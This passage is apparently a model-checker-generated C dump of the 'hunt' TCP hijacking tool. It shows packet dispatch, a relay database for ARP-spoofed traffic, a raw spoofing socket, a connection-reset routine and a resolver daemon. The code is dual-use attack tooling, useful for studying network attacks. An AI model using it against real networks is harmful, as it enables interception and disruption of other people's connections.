  fprintf(stdout, "%s [%d] seq=(%u) ack=(%u)\t--->\t%s [%d] len=%d/%d\n", return_value_host_lookup_1, tmp_statement_expression_2, (unsigned int)return_value___bswap_32_3, tmp_if_expr_5, return_value_host_lookup_6, tmp_statement_expression_7, p->p_raw_len, p->p_data_len);
}

// print_user_conn_info
// file hunt.c line 1024
void print_user_conn_info(struct user_conn_info *uci, signed int count)
{
  signed int i;
  signed int ret;
  i = 0;
  for( ; !(i >= count); i = i + 1)
  {
    char *return_value_host_lookup_1;
    return_value_host_lookup_1=host_lookup((unsigned int)uci->src_addr, hl_mode);
    char *return_value_port_lookup_2;
    return_value_port_lookup_2=port_lookup(uci->src_port, hl_mode);
    ret = printf("%d) %s [%s]", i, return_value_host_lookup_1, return_value_port_lookup_2);
    printf("%*s", 25 - ret > 0 ? 20 - ret : 0, (const void *)"");
    printf(" --> ");
    char *return_value_host_lookup_3;
    return_value_host_lookup_3=host_lookup((unsigned int)uci->dst_addr, hl_mode);
    char *return_value_port_lookup_4;
    return_value_port_lookup_4=port_lookup(uci->dst_port, hl_mode);
    printf("%s [%s]\n", return_value_host_lookup_3, return_value_port_lookup_4);
  }
}

// printed_lines_per_page
// file options.c line 162
static void printed_lines_per_page(void)
{
  signed int n = lines_o;
  if(n == 1000000)
    n = 0;

  n=menu_choose_unr("Number of printed lines per page in listenings", 0, 10000, n);
  if(n >= 0)
  {
    if(n == 0)
      lines_o = 1000000;

    else
      lines_o = n;
  }

}

// process_arp
// file hunt.c line 597
static void process_arp(struct packet *p)
{
  struct ifunc_item *li;
  struct list_iterator iter;
  list_iter_set(&iter, &l_ifunc_arp);
  void *return_value_list_iter_get_1;
  return_value_list_iter_get_1=list_iter_get(&iter);
  li = (struct ifunc_item *)return_value_list_iter_get_1;
  if(!(li == ((struct ifunc_item *)NULL)))
    li->func(p, li->arg);

  list_iter_end(&iter);
}

// process_icmp
// file hunt.c line 586
static void process_icmp(struct packet *p)
{
  struct ifunc_item *li;
  struct list_iterator iter;
  list_iter_set(&iter, &l_ifunc_icmp);
  void *return_value_list_iter_get_1;
  return_value_list_iter_get_1=list_iter_get(&iter);
  li = (struct ifunc_item *)return_value_list_iter_get_1;
  if(!(li == ((struct ifunc_item *)NULL)))
    li->func(p, li->arg);

  list_iter_end(&iter);
}

// process_ip
// file hunt.c line 608
static void process_ip(struct packet *p)
{
  struct ifunc_item *li;
  struct list_iterator iter;
  list_iter_set(&iter, &l_ifunc_ip);
  void *return_value_list_iter_get_1;
  return_value_list_iter_get_1=list_iter_get(&iter);
  li = (struct ifunc_item *)return_value_list_iter_get_1;
  if(!(li == ((struct ifunc_item *)NULL)))
    li->func(p, li->arg);

  list_iter_end(&iter);
}

// process_pktrelay
// file hunt.h line 620
signed int process_pktrelay(struct packet *p, struct arp_spoof_info *asi)
{
  struct relay_item *ri;
  signed int retval;
  ri=packet_match_relay(p);
  if(ri == ((struct relay_item *)NULL))
    return 0;

  else
  {
    retval = 0;
    if(!((1u & ri->flags) == 0u))
      retval = 1;

    if(!((2u & ri->flags) == 0u))
    {
      ethtap_relay(p, ri);
      retval = 1;
    }

    ri_release(ri);
    return retval;
  }
}

// process_tcp
// file hunt.c line 564
static void process_tcp(struct packet *p)
{
  struct ifunc_item *li;
  struct list_iterator iter;
  list_iter_set(&iter, &l_ifunc_tcp);
  void *return_value_list_iter_get_1;
  return_value_list_iter_get_1=list_iter_get(&iter);
  li = (struct ifunc_item *)return_value_list_iter_get_1;
  if(!(li == ((struct ifunc_item *)NULL)))
    li->func(p, li->arg);

  list_iter_end(&iter);
}

// process_udp
// file hunt.c line 575
static void process_udp(struct packet *p)
{
  struct ifunc_item *li;
  struct list_iterator iter;
  list_iter_set(&iter, &l_ifunc_udp);
  void *return_value_list_iter_get_1;
  return_value_list_iter_get_1=list_iter_get(&iter);
  li = (struct ifunc_item *)return_value_list_iter_get_1;
  if(!(li == ((struct ifunc_item *)NULL)))
    li->func(p, li->arg);

  list_iter_end(&iter);
}

// putchar
// file /usr/include/x86_64-linux-gnu/bits/stdio.h line 79
static inline signed int putchar(signed int __c)
{
  signed int return_value__IO_putc_1;
  return_value__IO_putc_1=_IO_putc(__c, stdout);
  return return_value__IO_putc_1;
}

// putchar_link1
// file /usr/include/x86_64-linux-gnu/bits/stdio.h line 79
static inline signed int putchar_link1(signed int __c_link1)
{
  signed int return_value__IO_putc_1_link1;
  return_value__IO_putc_1_link1=_IO_putc(__c_link1, stdout);
  return return_value__IO_putc_1_link1;
}

// rawsock
// file util.c line 237
signed int rawsock(void)
{
  signed int fd;
  signed int val = 1;
  fd=socket(2, 3, 255);
  if(!(fd >= 0))
  {
    if(!(verbose == 0))
      perror("\n(rawsock) Socket problems [fatal]");

    exit(1);
  }

  signed int return_value_setsockopt_1;
  return_value_setsockopt_1=setsockopt(fd, 0, 3, (const void *)&val, (unsigned int)sizeof(signed int) /*4ul*/ );
  if(!(return_value_setsockopt_1 >= 0))
  {
    if(!(verbose == 0))
    {
      perror("Cannot set IP_HDRINCL socket option");
      fprintf(stderr, "\nIf you are relying on this rather then a hacked kernel to spoof packets, your sunk.\n[cr]");
      getchar();
    }

  }

  return fd;
}

// register_timejob
// file timer.c line 65
void register_timejob(struct timejob *tj)
{
  pthread_mutex_lock(&timejob_mutex);
  signed int return_value___register_1;
  return_value___register_1=__register(tj);
  if(!(return_value___register_1 == 0))
    pthread_cond_signal(&timejob_cond);

  pthread_mutex_unlock(&timejob_mutex);
}

// register_timejob_milsec_rel
// file hunt.h line 644
void register_timejob_milsec_rel(struct timejob *tj, signed int milsec)
{
  struct timeval tv;
  signed int sec;
  signed int msec;
  gettimeofday(&tv, (struct timezone *)(void *)0);
  sec = milsec / 1000;
  msec = milsec % 1000;
  tj->j_ts.tv_sec = tv.tv_sec + (signed long int)sec;
  tj->j_ts.tv_nsec = tv.tv_usec * (signed long int)1000 + (signed long int)(msec * 1000000);
  register_timejob(tj);
}

// register_timejob_rel
// file hunt.h line 643
void register_timejob_rel(struct timejob *tj, signed int relsec)
{
  struct timeval tv;
  gettimeofday(&tv, (struct timezone *)(void *)0);
  tj->j_ts.tv_sec = tv.tv_sec + (signed long int)relsec;
  tj->j_ts.tv_nsec = tv.tv_usec * (signed long int)1000;
  register_timejob(tj);
}

// relay_add_item
// file pktrelay.c line 257
static void relay_add_item(void)
{
  struct relay_item *ri;
  unsigned int src_ip;
  unsigned int dst_ip;
  unsigned int src_mask;
  unsigned int dst_mask;
  signed int src_ports[17l];
  signed int dst_ports[17l];
  char name_buf[128l];
  char name_buf2[256l];
  char ethtap_mac[6l];
  signed int flags_c;
  signed int nr;
  signed int ethtap_fd = -1;
  signed int return_value_menu_choose_host_mask_ports_dfl_1;
  return_value_menu_choose_host_mask_ports_dfl_1=menu_choose_host_mask_ports_dfl("src ip addr/mask ports", &src_ip, &src_mask, (unsigned int *)src_ports, (unsigned int)0, (unsigned int)0, (signed int *)(void *)0);
  char *return_value___strdup_6;
  if(return_value_menu_choose_host_mask_ports_dfl_1 >= 0)
  {
    signed int return_value_menu_choose_host_mask_ports_dfl_2;
    return_value_menu_choose_host_mask_ports_dfl_2=menu_choose_host_mask_ports_dfl("dst ip addr/mask ports", &dst_ip, &dst_mask, (unsigned int *)dst_ports, (unsigned int)0, (unsigned int)0, (signed int *)(void *)0);
    if(return_value_menu_choose_host_mask_ports_dfl_2 >= 0)
    {
      flags_c=menu_choose_char("flags: [n]one, [d]rop, [e]th_relay", "nde", (char)100);
      if(flags_c >= 0)
      {
        if(flags_c == 101)
        {
          signed int return_value_menu_choose_string_3;
          return_value_menu_choose_string_3=menu_choose_string("eth relay device", name_buf, (signed int)sizeof(char [128l]) /*128ul*/ , "tap0");
          if(!(return_value_menu_choose_string_3 >= 0))
            goto __CPROVER_DUMP_L12;

          strcpy(name_buf2, "/dev/");
          strcat(name_buf2, name_buf);
          ethtap_fd=open(name_buf2, 02);
          if(!(ethtap_fd >= 0))
          {
            printf("cannot open %s for read/write\n", (const void *)name_buf2);
            goto __CPROVER_DUMP_L12;
          }

          get_ifc_info(name_buf, (unsigned int *)(void *)0, ethtap_mac);
        }

        signed int return_value_list_count_4;
        return_value_list_count_4=list_count(&l_relay_db);
        signed int return_value_list_count_5;
        return_value_list_count_5=list_count(&l_relay_db);
        nr=menu_choose_unr("insert at", 0, return_value_list_count_4, return_value_list_count_5);
        if(!(nr == -1))
        {
          ri=ri_allocate();
          ri->src_addr = src_ip;
          ri->src_mask = src_mask;
          port_htons((unsigned int *)src_ports);
          memcpy((void *)ri->src_ports, (const void *)src_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
          ri->dst_addr = dst_ip;
          ri->dst_mask = dst_mask;
          port_htons((unsigned int *)dst_ports);
          memcpy((void *)ri->dst_ports, (const void *)dst_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
          switch(flags_c)
          {
            case 100:
            {
              ri->flags = (unsigned int)1;
              break;
            }
            case 101:
            {
              ri->flags = (unsigned int)2;
              return_value___strdup_6=__strdup(name_buf);
              ri->ethtap_name = return_value___strdup_6;
              ri->ethtap_fd = ethtap_fd;
              memcpy((void *)ri->ethtap_mac, (const void *)ethtap_mac, (unsigned long int)6);
              break;
            }
            default:
              ri->flags = (unsigned int)0;
          }
          list_insert_at(&l_relay_db, nr, (void *)ri);
        }

      }

    }

  }


__CPROVER_DUMP_L12:
  ;
}

// relay_del_item
// file pktrelay.c line 402
static void relay_del_item(void)
{
  signed int i;
  struct relay_item *ri;
  relay_list_items();
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_relay_db);
  i=menu_choose_unr("item nr. to delete", 0, return_value_list_count_1 - 1, -1);
  if(i >= 0)
  {
    void *return_value_list_remove_at_2;
    return_value_list_remove_at_2=list_remove_at(&l_relay_db, i);
    ri = (struct relay_item *)return_value_list_remove_at_2;
    ri_free(ri);
  }

}

// relay_item_print
// file pktrelay.c line 217
static void relay_item_print(signed int i, struct relay_item *ri)
{
  char buf_src_ports[512l];
  char buf_dst_ports[512l];
  char buf[512l];
  char flags[512l];
  sprintf_db_ports(ri->src_ports, buf_src_ports, (signed int)sizeof(char [512l]) /*512ul*/ , 1);
  sprintf_db_ports(ri->dst_ports, buf_dst_ports, (signed int)sizeof(char [512l]) /*512ul*/ , 1);
  char *return_value_host_lookup_1;
  return_value_host_lookup_1=host_lookup(ri->src_addr, hl_mode);
  signed int return_value_count_mask_2;
  return_value_count_mask_2=count_mask(ri->src_mask);
  sprintf(buf, "%s/%d [%s]", return_value_host_lookup_1, return_value_count_mask_2, (const void *)buf_src_ports);
  switch(ri->flags)
  {
    case (unsigned int)1:
    {
      sprintf(flags, "DROP");
      break;
    }
    case (unsigned int)2:
      sprintf(flags, "ETH RELAY to %s", ri->ethtap_name);
  }
  char *return_value_host_lookup_3;
  return_value_host_lookup_3=host_lookup(ri->dst_addr, hl_mode);
  signed int return_value_count_mask_4;
  return_value_count_mask_4=count_mask(ri->dst_mask);
  printf("%2d) %-24s --> %s/%d [%s] flags %s\n", i, (const void *)buf, return_value_host_lookup_3, return_value_count_mask_4, (const void *)buf_dst_ports, (const void *)flags);
}

// relay_list_items
// file pktrelay.c line 241
static void relay_list_items(void)
{
  struct list_iterator li;
  struct relay_item *ri;
  signed int i = 0;
  list_iter_set(&li, &l_relay_db);
  void *return_value_list_iter_get_1;
  signed int tmp_post_2;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    ri = (struct relay_item *)return_value_list_iter_get_1;
    if(ri == ((struct relay_item *)NULL))
      break;

    tmp_post_2 = i;
    i = i + 1;
    relay_item_print(tmp_post_2, ri);
    if(i % lines_o == 0)
      lines_o_press_key();

  }
  while((_Bool)1);
  list_iter_end(&li);
}

// relay_menu
// file hunt.h line 619
void relay_menu(void)
{
  char *r_menu = "l)     list relay database\na/m/d) add/mod/del entry\nx)     return\n";
  char *r_keys = "ladmx";
  signed int run_it = 1;
  while(!(run_it == 0))
  {
    signed int return_value_menu_1;
    return_value_menu_1=menu("relay database", r_menu, "arps/relay", r_keys, (char)0);
    switch(return_value_menu_1)
    {
      case 108:
      {
        relay_list_items();
        break;
      }
      case 97:
      {
        relay_add_item();
        break;
      }
      case 100:
      {
        relay_del_item();
        break;
      }
      case 109:
      {
        relay_mod_item();
        break;
      }
      case 120:
        run_it = 0;
    }
  }
}

// relay_mod_item
// file pktrelay.c line 316
static void relay_mod_item(void)
{
  struct relay_item *ri;
  unsigned int src_ip;
  unsigned int dst_ip;
  unsigned int src_mask;
  unsigned int dst_mask;
  signed int src_ports[17l];
  signed int dst_ports[17l];
  char name_buf[128l];
  char name_buf2[256l];
  signed int nr;
  char flags_dfl;
  signed int flags_c;
  signed int ethtap_fd = -1;
  relay_list_items();
  signed int return_value_list_count_1;
  return_value_list_count_1=list_count(&l_relay_db);
  signed int return_value_list_count_2;
  return_value_list_count_2=list_count(&l_relay_db);
  nr=menu_choose_unr("choose item", 0, return_value_list_count_1 - 1, return_value_list_count_2 - 1);
  signed int tmp_statement_expression_7;
  if(!(nr == -1))
  {
    void *return_value_list_at_3;
    return_value_list_at_3=list_at(&l_relay_db, nr);
    ri = (struct relay_item *)return_value_list_at_3;
    if(!(ri == ((struct relay_item *)NULL)))
    {
      signed int return_value_menu_choose_host_mask_ports_dfl_4;
      return_value_menu_choose_host_mask_ports_dfl_4=menu_choose_host_mask_ports_dfl("src ip addr/mask ports", &src_ip, &src_mask, (unsigned int *)src_ports, ri->src_addr, ri->src_mask, (signed int *)ri->src_ports);
      if(return_value_menu_choose_host_mask_ports_dfl_4 >= 0)
      {
        signed int return_value_menu_choose_host_mask_ports_dfl_5;
        return_value_menu_choose_host_mask_ports_dfl_5=menu_choose_host_mask_ports_dfl("dst ip addr/mask ports", &dst_ip, &dst_mask, (unsigned int *)dst_ports, ri->dst_addr, ri->dst_mask, (signed int *)ri->dst_ports);
        if(return_value_menu_choose_host_mask_ports_dfl_5 >= 0)
        {
          switch(ri->flags)
          {
            case (unsigned int)1:
            {
              flags_dfl = (char)100;
              break;
            }
            case (unsigned int)2:
            {
              flags_dfl = (char)101;
              break;
            }
            default:
              flags_dfl = (char)110;
          }
          flags_c=menu_choose_char("flags: [n]one [d]rop [e]th_relay", "nde", flags_dfl);
          if(flags_c >= 0)
          {
            if(flags_c == 101)
            {
              signed int return_value_menu_choose_string_6;
              return_value_menu_choose_string_6=menu_choose_string("eth relay device", name_buf, (signed int)sizeof(char [128l]) /*128ul*/ , ri->ethtap_name);
              if(!(return_value_menu_choose_string_6 >= 0))
                goto __CPROVER_DUMP_L20;

              unsigned long int __s1_len;
              unsigned long int __s2_len;
              signed int return_value___builtin_strcmp_8;
              return_value___builtin_strcmp_8=__builtin_strcmp(name_buf, ri->ethtap_name);
              tmp_statement_expression_7 = return_value___builtin_strcmp_8;
              if(!(tmp_statement_expression_7 == 0))
              {
                strcpy(name_buf2, "/dev/");
                strcat(name_buf2, name_buf);
                ethtap_fd=open(name_buf2, 02);
                if(!(ethtap_fd >= 0))
                {
                  printf("cannot open %s for read/write\n", (const void *)name_buf2);
                  goto __CPROVER_DUMP_L20;
                }

              }

            }

            port_htons((unsigned int *)src_ports);
            port_htons((unsigned int *)dst_ports);
            ri->src_addr = src_ip;
            ri->src_mask = src_mask;
            memcpy((void *)ri->src_ports, (const void *)src_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
            ri->dst_addr = dst_ip;
            ri->dst_mask = dst_mask;
            memcpy((void *)ri->dst_ports, (const void *)dst_ports, sizeof(signed int) /*4ul*/  * (unsigned long int)(16 + 1));
            if(ethtap_fd >= 0 || !(flags_c == 101))
            {
              if(ri->ethtap_fd >= 0)
              {
                close(ri->ethtap_fd);
                ri->ethtap_fd = -1;
              }

              if(!(ri->ethtap_name == ((char *)NULL)))
              {
                free((void *)ri->ethtap_name);
                ri->ethtap_name = (char *)(void *)0;
              }

            }

            switch(flags_c)
            {
              case 100:
              {
                ri->flags = (unsigned int)1;
                break;
              }
              case 101:
              {
                ri->flags = (unsigned int)2;
                if(ethtap_fd >= 0)
                {
                  ri->ethtap_fd = ethtap_fd;
                  char *return_value___strdup_9;
                  return_value___strdup_9=__strdup(name_buf);
                  ri->ethtap_name = return_value___strdup_9;
                }

                break;
              }
              default:
                ri->flags = (unsigned int)0;
            }
          }

        }

      }

    }

  }


__CPROVER_DUMP_L20:
  ;
}

// relay_modify_hook
// file arpspoof.c line 701
static void relay_modify_hook(struct packet *p_new)
{
  ;
}

// remove_conn_if_dont_match
// file hunt.c line 201
void remove_conn_if_dont_match(void)
{
  struct hash_iterator hi;
  struct conn_info *ci;
  unsigned int key;
  signed int count_to_remove = 0;
  unsigned int *key_to_remove;
  struct conn_info **ci_to_remove;
  hash_lock(&conn_table);
  count_to_remove = 0;
  signed int return_value_hash_count_1;
  return_value_hash_count_1=hash_count(&conn_table);
  void *return_value___builtin_alloca_2;
  return_value___builtin_alloca_2=__builtin_alloca(sizeof(unsigned int) /*4ul*/  * (unsigned long int)return_value_hash_count_1);
  key_to_remove = (unsigned int *)return_value___builtin_alloca_2;
  signed int return_value_hash_count_3;
  return_value_hash_count_3=hash_count(&conn_table);
  void *return_value___builtin_alloca_4;
  return_value___builtin_alloca_4=__builtin_alloca(sizeof(struct conn_info *) /*8ul*/  * (unsigned long int)return_value_hash_count_3);
  ci_to_remove = (struct conn_info **)return_value___builtin_alloca_4;
  hash_iter_set(&hi, &conn_table);
  void *return_value_hash_iter_get_5;
  signed int tmp_post_6;
  do
  {
    return_value_hash_iter_get_5=hash_iter_get(&hi, &key);
    ci = (struct conn_info *)return_value_hash_iter_get_5;
    if(ci == ((struct conn_info *)NULL))
      break;

    signed int return_value_conn_add_match_7;
    return_value_conn_add_match_7=conn_add_match((unsigned int)ci->src_addr, (unsigned int)ci->dst_addr, ci->src_port, ci->dst_port);
    if(return_value_conn_add_match_7 == 0)
    {
      ci_to_remove[(signed long int)count_to_remove] = ci;
      tmp_post_6 = count_to_remove;
      count_to_remove = count_to_remove + 1;
      key_to_remove[(signed long int)tmp_post_6] = key;
    }

  }
  while((_Bool)1);
  hash_iter_end(&hi);
  for( ; count_to_remove >= 0; count_to_remove = count_to_remove - 1)
    hash_remove(&conn_table, key_to_remove[(signed long int)count_to_remove], (void *)ci_to_remove[(signed long int)count_to_remove]);
  hash_unlock(&conn_table);
}

// remove_idle_slaves
// file resolv.c line 291
static void remove_idle_slaves(struct list *slaves)
{
  struct list_iterator li;
  struct slave *sl;
  signed long int cur_time;
  cur_time=time((signed long int *)(void *)0);
  list_iter_set(&li, slaves);
  void *return_value_list_iter_get_1;
  do
  {
    return_value_list_iter_get_1=list_iter_get(&li);
    sl = (struct slave *)return_value_list_iter_get_1;
    if(sl == ((struct slave *)NULL))
      break;

    if(sl->s_req.ip == 0u)
    {
      if(!(60l + sl->s_timestamp >= cur_time))
      {
        kill(sl->s_pid, 15);
        waitpid(sl->s_pid, (signed int *)(void *)0, 0);
        close(sl->s_fd);
        list_remove(slaves, (void *)sl);
        free((void *)sl);
      }

    }

  }
  while((_Bool)1);
  list_iter_end(&li);
}

// reset_connection
// file main.c line 207
void reset_connection(void)
{
  struct user_conn_info uci;
  signed int c;
  signed int return_value_choose_connection_1;
  return_value_choose_connection_1=choose_connection(&uci);
  if(return_value_choose_connection_1 == 0)
  {
    c=menu_choose_sdb("reset", (char)98);
    switch(c)
    {
      case 100:
      {
        user_rst(&uci, 1, 1);
        printf("done\n");
        break;
      }
      case 115:
      {
        user_rst(&uci, 1, 0);
        printf("done\n");
        break;
      }
      case 98:
      {
        user_rst(&uci, 1, 2);
        printf("done\n");
      }
    }
  }

}

// resolv_daemon
// file resolv.c line 346
static void resolv_daemon(signed int fd)
{
  struct list_iterator li;
  struct sigaction sa;
  struct req req;
  struct list slaves = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct slave *)0)->s_next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
  struct list requests = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct req *)0)->next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
  struct req *r;
  struct anonymous_29 select_fd;
  signed int select_max;
  struct timeval timeout;
  struct slave *sl;
  signed int retval;
  signed int return_value_getpid_1;
  if(!(verbose == 0))
  {
    return_value_getpid_1=getpid();
    printf("resolv daemon pid %d\n", return_value_getpid_1);
  }

  signed int return_value_getpid_2;
  return_value_getpid_2=getpid();
  setpriority(0, (unsigned int)return_value_getpid_2, 10);
  resolv_daemon_run = 1;
  sa.__sigaction_handler.sa_handler = sig_term;
  sigemptyset(&sa.sa_mask);
  sa.sa_flags = 0x10000000;
  sigaction(15, &sa, (struct sigaction *)(void *)0);
  signed int return_value_kill_3;
  void *return_value_list_iter_get_4;
  signed int tmp_if_expr_5;
  void *return_value_list_iter_get_6;
  while(!(resolv_daemon_run == 0))
  {
    return_value_kill_3=kill(pid_parent, 0);
    if(!(return_value_kill_3 == 0))
      break;

    do
    {
      signed int __d0;
      signed int __d1;
      asm("cld; rep; stosq" : "=c"(__d0), "=D"(__d1) : "a"(0), "0"(sizeof(struct anonymous_29) /*128ul*/  / sizeof(signed long int) /*8ul*/ ), "1"(&(&select_fd)->__fds_bits[(signed long int)0]) : "memory");
    }
    while((_Bool)0);
    select_max = 0;
    list_iter_set(&li, &slaves);
    do
    {
      return_value_list_iter_get_4=list_iter_get(&li);
      sl = (struct slave *)return_value_list_iter_get_4;
      if(sl == ((struct slave *)NULL))
        break;

      (&select_fd)->__fds_bits[(signed long int)(sl->s_fd / (8 * (signed int)sizeof(signed long int) /*8ul*/ ))] = (&select_fd)->__fds_bits[(signed long int)(sl->s_fd / (8 * (signed int)sizeof(signed long int) /*8ul*/ ))] | (signed long int)(1UL << sl->s_fd % (8 * (signed int)sizeof(signed long int) /*8ul*/ ));
      if(!(sl->s_fd >= select_max))
        tmp_if_expr_5 = select_max;

      else
        tmp_if_expr_5 = sl->s_fd;
      select_max = tmp_if_expr_5;
    }
    while((_Bool)1);
    list_iter_end(&li);
    (&select_fd)->__fds_bits[(signed long int)(fd / (8 * (signed int)sizeof(signed long int) /*8ul*/ ))] = (&select_fd)->__fds_bits[(signed long int)(fd / (8 * (signed int)sizeof(signed long int) /*8ul*/ ))] | (signed long int)(1UL << fd % (8 * (signed int)sizeof(signed long int) /*8ul*/ ));
    select_max = select_max > fd ? select_max : fd;
    timeout.tv_sec = (signed long int)10;
    timeout.tv_usec = (signed long int)0;
    retval=select(select_max + 1, &select_fd, (struct anonymous_29 *)(void *)0, (struct anonymous_29 *)(void *)0, &timeout);
    if(retval >= 1)
    {
      list_iter_set(&li, &slaves);
      do
      {
        return_value_list_iter_get_6=list_iter_get(&li);
        sl = (struct slave *)return_value_list_iter_get_6;
        if(sl == ((struct slave *)NULL))
          break;

        if(!((select_fd.__fds_bits[(signed long int)(sl->s_fd / 8)] & (signed long int)(1UL << sl->s_fd % 8)) == 0l))
          handle_response(fd, sl);

      }
      while((_Bool)1);
      list_iter_end(&li);
      if(!((select_fd.__fds_bits[(signed long int)(fd / 8)] & (signed long int)(1UL << fd % 8)) == 0l))
      {
        signed long int return_value_read_8;
        return_value_read_8=read(fd, (void *)&req, sizeof(struct req) /*16ul*/ );
        if((unsigned long int)return_value_read_8 == sizeof(struct req) /*16ul*/ )
        {
          void *return_value_malloc_7;
          return_value_malloc_7=malloc(sizeof(struct req) /*16ul*/ );
          r = (struct req *)return_value_malloc_7;
          *r = req;
          list_enqueue(&requests, (void *)r);
        }

      }

      send_req_to_slave(fd, &slaves, &requests);
    }

    remove_idle_slaves(&slaves);
  }
  cleanup_slaves(&slaves);
  close(fd);
  exit(0);
}

// resolv_done
// file hunt.h line 457
void resolv_done(void)
{
  kill(pid_req, 15);
  waitpid(pid_req, (signed int *)(void *)0, 0);
}

// resolv_get
// file resolv.c line 79
struct resolv_item * resolv_get(unsigned int ip)
{
  struct resolv_item *r;
  hash_lock(&ip_to_name_table);
  void *return_value_hash_get_1;
  return_value_hash_get_1=hash_get(&ip_to_name_table, ip, (void *)0);
  r = (struct resolv_item *)return_value_hash_get_1;
  if(!(r == ((struct resolv_item *)NULL)))
  {
    pthread_mutex_lock(&r->mutex);
    r->get_timestamp=time((signed long int *)(void *)0);
  }

  hash_unlock(&ip_to_name_table);
  return r;
}

// resolv_init
// file hunt.h line 456
void resolv_init(void)
{
  signed int pipe[2l];
  unsigned long int res_update_thr;
  pid_parent=getppid();
  socketpair(1, 1, 0, pipe);
  pid_req=fork();
  if(pid_req == 0)
  {
    close(pipe[(signed long int)0]);
    sigprocmask(0, &intr_mask, (struct anonymous_3 *)(void *)0);
    resolv_daemon(pipe[(signed long int)1]);
  }

  else
    if(!(pid_req >= 0))
    {
      printf("dns daemon failed to start - exiting\n");
      exit(1);
    }

  close(pipe[(signed long int)1]);
  fd_req = pipe[(signed long int)0];
  hash_init(&ip_to_name_table, 100, (signed int (*)(unsigned int, void *, void *))(void *)0);
  pthread_create(&res_update_thr, (const union pthread_attr_t *)(void *)0, update_thr, (void *)fd_req);
}

// resolv_put
// file resolv.c line 65
void resolv_put(unsigned int ip, const char *name)
{
  struct resolv_item *r;
  hash_lock(&ip_to_name_table);
  resolv_remove(ip);
  void *return_value_malloc_1;
  return_value_malloc_1=malloc(sizeof(struct resolv_item) /*64ul*/ );
  r = (struct resolv_item *)return_value_malloc_1;
  char *return_value___strdup_2;
  return_value___strdup_2=__strdup(name);
  r->name = return_value___strdup_2;
  r->get_timestamp=time((signed long int *)(void *)0);
  r->put_timestamp = r->get_timestamp;
  pthread_mutex_init(&r->mutex, (const union anonymous_9 *)(void *)0);
  hash_put(&ip_to_name_table, ip, (void *)r);
  hash_unlock(&ip_to_name_table);
}

// resolv_release
// file resolv.c line 92
void resolv_release(struct resolv_item *r)
{
  pthread_mutex_unlock(&r->mutex);
}

// resolv_remove
// file resolv.c line 53
void resolv_remove(unsigned int ip)
{
  struct resolv_item *r;
  void *return_value_hash_remove_1;
  return_value_hash_remove_1=hash_remove(&ip_to_name_table, ip, (void *)0);
  r = (struct resolv_item *)return_value_hash_remove_1;
  if(!(r == ((struct resolv_item *)NULL)))
  {
    pthread_mutex_lock(&r->mutex);
    if(!(r->name == ((char *)NULL)))
      free((void *)r->name);

    free((void *)r);
  }

}

// resolv_request
// file resolv.c line 97
void resolv_request(unsigned int ip)
{
  struct req req;
  struct in_addr addr;
  addr.s_addr = ip;
  req.ip = ip;
  req.next = (struct req *)(void *)0;
  write(fd_req, (const void *)&req, sizeof(struct req) /*16ul*/ );
  char *return_value_inet_ntoa_1;
  return_value_inet_ntoa_1=inet_ntoa(addr);
  resolv_put(ip, return_value_inet_ntoa_1);
}

// resolv_slave
// file resolv.c line 178
static void resolv_slave(signed int fd)
{
  struct sigaction sa;
  struct in_addr addr;
  struct hostent *host_ent;
  struct timeval timeout;
  char buf[256l];
  struct res *res;
  struct req req;
  char *name;
  struct anonymous_29 rdset;
  signed int retval;
  signed int return_value_getpid_1;
  return_value_getpid_1=getpid();
  setpriority(0, (unsigned int)return_value_getpid_1, 10);
  resolv_slave_run = 1;
  sa.__sigaction_handler.sa_handler = sig_slave_term;
  sigemptyset(&sa.sa_mask);
  sa.sa_flags = 0x10000000;
  sigaction(15, &sa, (struct sigaction *)(void *)0);
  signed int return_value_getppid_2;
  signed long int return_value_read_4;
  while(!(resolv_slave_run == 0))
  {
    return_value_getppid_2=getppid();
    if(return_value_getppid_2 == 1)
      break;

    do
    {
      signed int __d0;
      signed int __d1;
      asm("cld; rep; stosq" : "=c"(__d0), "=D"(__d1) : "a"(0), "0"(sizeof(struct anonymous_29) /*128ul*/  / sizeof(signed long int) /*8ul*/ ), "1"(&(&rdset)->__fds_bits[(signed long int)0]) : "memory");
    }
    while((_Bool)0);
    (&rdset)->__fds_bits[(signed long int)(fd / (8 * (signed int)sizeof(signed long int) /*8ul*/ ))] = (&rdset)->__fds_bits[(signed long int)(fd / (8 * (signed int)sizeof(signed long int) /*8ul*/ ))] | (signed long int)(1UL << fd % (8 * (signed int)sizeof(signed long int) /*8ul*/ ));
    timeout.tv_sec = (signed long int)10;
    timeout.tv_usec = (signed long int)0;
    retval=select(fd + 1, &rdset, (struct anonymous_29 *)(void *)0, (struct anonymous_29 *)(void *)0, &timeout);
    if(retval >= 1)
